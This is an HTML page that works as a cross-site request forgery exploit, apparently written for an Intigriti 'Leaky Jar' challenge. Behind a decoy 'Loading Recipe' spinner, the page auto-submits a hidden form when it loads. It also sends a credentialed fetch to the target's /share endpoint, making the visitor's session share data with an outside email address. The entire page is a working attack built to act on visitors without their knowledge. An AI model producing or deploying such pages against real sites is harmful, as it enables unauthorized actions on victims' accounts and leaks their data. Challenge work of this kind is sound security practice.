<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Leaky Jar - New Recipe Shared!</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 500px;
        }
        h1 {
            color: #333;
            margin: 0 0 10px 0;
        }
        p {
            color: #666;
            margin: 0;
            font-size: 16px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🍪 Loading Recipe...</h1>
        <div class="spinner"></div>
        <p>Sharing your favorite recipe with stratumLR@outlook.com</p>
    </div>

    <!-- Hidden CSRF Form -->
    <form id="csrf-form" action="https://leakyjar.intigriti.io/share" method="POST" style="display:none;">
        <input type="hidden" name="username" value="stratumLR@outlook.com">
    </form>

    <script>
        // Auto-submit the CSRF form when page loads
        window.addEventListener('load', function() {
            // Give cookies time to be sent, then submit
            setTimeout(function() {
                document.getElementById('csrf-form').submit();
            }, 100);
        });

        // Fallback: try to submit immediately
        document.getElementById('csrf-form').submit();

        // Optional: Attempt via fetch as well (in case form submission is blocked)
        fetch('https://leakyjar.intigriti.io/share', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'username=stratumLR@outlook.com'
        }).catch(err => console.log('Fetch attempt:', err));
    </script>
</body>
</html>
